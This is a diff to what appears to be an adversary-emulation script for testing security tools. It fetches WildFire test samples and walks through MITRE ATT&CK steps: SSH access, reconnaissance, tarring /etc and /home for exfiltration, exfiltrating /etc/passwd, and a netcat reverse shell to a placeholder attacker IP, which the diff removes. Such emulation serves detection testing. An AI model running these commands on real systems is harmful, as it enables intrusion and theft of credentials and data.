@@ -69,11 +69,22 @@ echo "[+] Changing C2 Client file permissions to executable"
 chmod +x c2.sh
 sleep 3
 
-wget http://wildfire.paloaltonetworks.com/publicapi/test/pe 
-wget wildfire.paloaltonetworks.com/publicapi/test/elf
+# Wildfire test samples 
+echo "[+] Getting http wildfire test samples"
+wget http://wildfire.paloaltonetworks.com/publicapi/test/pe -O process.exe 
+wget http://wildfire.paloaltonetworks.com/publicapi/test/elf -O panwelf
+wget http://wildfire.paloaltonetworks.com/publicapi/test/macos -O macos
+
+
+echo "[+] Getting https wildfire test samples"
+wget https://wildfire.paloaltonetworks.com/publicapi/test/pe -O process1.exe 
+wget https://wildfire.paloaltonetworks.com/publicapi/test/apk -O apk
+wget https://wildfire.paloaltonetworks.com/publicapi/test/macos -O macos
+wget https://wildfire.paloaltonetworks.com/publicapi/test/elf -O panwelf2
 
 # SCENARIO  3 --- MITRE ATT&CK TTP Demonstration Script
 echo "[+] Senario 3 MITTRE ATTACK TTP"
+
 # === Initial Access and Execution ===
 echo "[*] Attempting SSH Access..."
 ssh user@localhost || echo "[!] SSH failed - Continuing..."
@@ -117,7 +128,7 @@ echo "[*] Checking network interfaces..."
 ifconfig -a
 
 echo "[*] Listing running processes..."
-ps aux
+ps aux -a
 
 echo "[*] Listing contents of critical directories..."
 ls -alh /etc
@@ -134,7 +145,6 @@ echo "[*] Archiving files for exfiltration..."
 tar -czvf collected_data.tar.gz /etc /home
 
 echo "[*] Creating reverse shell using netcat..."
-nc -e /bin/sh [ATTACKER_IP] [PORT] || echo "[!] Netcat reverse shell failed - Continuing..."
 
 # === Exfiltration ===
 echo "[*] Exfiltrating /etc/passwd..."
